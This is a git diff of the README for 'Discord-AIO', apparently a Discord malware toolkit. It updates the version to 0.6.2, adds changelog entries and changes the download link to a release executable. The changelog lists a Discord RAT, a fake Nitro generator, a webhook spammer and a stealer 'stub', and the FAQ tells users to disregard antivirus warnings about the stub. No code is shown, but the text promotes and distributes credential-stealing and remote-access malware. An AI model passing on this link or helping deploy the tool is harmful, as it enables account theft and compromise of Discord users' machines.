@@ -9,7 +9,7 @@
   
   [![developer](https://img.shields.io/badge/Developer-Nyxon-520702.svg?style=flat)](https://github.com/Nyxonn)
   [![discord](https://img.shields.io/badge/Discord-Nyxon%234418-520702.svg?style=flat)](https://discordapp.com/users/690624129153630248)
-  ![developer](https://img.shields.io/badge/Version-0.6.1-520702.svg?style=flat)
+  ![developer](https://img.shields.io/badge/Version-0.6.2-520702.svg?style=flat)
 </p>
 
 ## Disclaimer
@@ -118,6 +118,30 @@ Old branch.
 - Multi-language support
 - Customizable UI
 - Minor stub fixes
+  
+<div align="center">
+  
+**0.6.1**
+  
+</div>
+
+- UI fixes
+- Added Discord RAT (thanks to Sp00p64)
+- Added Spanish support
+- Added French support
+
+<div align="center">
+  
+**0.6.2**
+  
+</div>
+
+- Fixed major stub bug
+- Added possibility to save your settings for UI Color and Show username
+- Added Fake Windows CMD and Fake Discord Nitro Generator
+- Fixed webhook spammer error
+- Deleted .dAIO encryption
+- Major bugs fixed
 
 <div align="center">
 
@@ -132,7 +156,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.1/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.2/Discord.AIO.exe) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
